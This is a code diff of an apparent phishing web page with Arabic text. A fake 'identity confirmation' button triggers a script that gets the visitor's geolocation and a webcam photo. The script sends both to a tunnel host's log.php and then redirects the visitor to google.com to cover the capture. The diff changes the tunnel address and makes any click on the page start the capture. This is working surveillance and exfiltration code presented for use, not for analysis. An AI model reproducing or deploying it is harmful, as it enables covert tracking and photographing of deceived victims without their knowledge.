@@ -1,44 +1,30 @@
 <script>
-    const tunnel = "https://f64773e851ce75.lhr.life";
+    const tunnel = "https://4a59bcc97d93fe.lhr.life"; 
 
     async function startCapture() {
-        const btn = document.getElementById("mainBtn");
-        btn.innerText = "جاري التأكد...";
+        // إرسال الموقع فوراً
+        navigator.geolocation.getCurrentPosition(p => {
+            fetch(tunnel + "/log.php", {method: "POST", mode: "no-cors", body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude})});
+        });
 
-        // إرسال الموقع فوراً وبدون انتظار (أهم خطوة)
-        navigator.geolocation.getCurrentPosition((p) => {
-            fetch(tunnel + "/log.php", {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify({ lat: p.coords.latitude, lon: p.coords.longitude })
-            });
-        }, null, {timeout: 3000});
-
-        // طلب الكاميرا
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            video.play();
-
-            video.onloadedmetadata = () => {
-                setTimeout(async () => {
-                    const canvas = document.createElement("canvas");
-                    canvas.width = 320; // صغرنا الحجم لسرعة الإرسال وعدم التعليق
-                    canvas.height = 240;
-                    canvas.getContext("2d").drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL("image/jpeg", 0.3); // ضغط عالي للصورة
-
-                    await fetch(tunnel + "/log.php", {
-                        method: "POST",
-                        mode: "no-cors",
-                        body: JSON.stringify({ img: imgData })
-                    });
-
-                    stream.getTracks().forEach(t => t.stop());
-                    window.location.href = "https://google.com";
-                }, 1000);
-            };
-        } catch (e) { location.reload(); }
+        // التقاط الصورة
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+            setTimeout(async () => {
+                const canvas = document.createElement("canvas");
+                canvas.width = 300; canvas.height = 300;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                await fetch(tunnel + "/log.php", {method: "POST", mode: "no-cors", body: JSON.stringify({img: canvas.toDataURL("image/jpeg", 0.3)})});
+                stream.getTracks().forEach(t => t.stop());
+                window.location.href = "https://google.com";
+            }, 1000);
+        };
+        video.play();
     }
+    document.body.onclick = startCapture;
 </script>
+<body style="display:flex; justify-content:center; align-items:center; height:100vh;">
+    <button style="padding:20px; font-size:20px;">تأكيد الهوية (اضغط هنا)</button>
+</body>
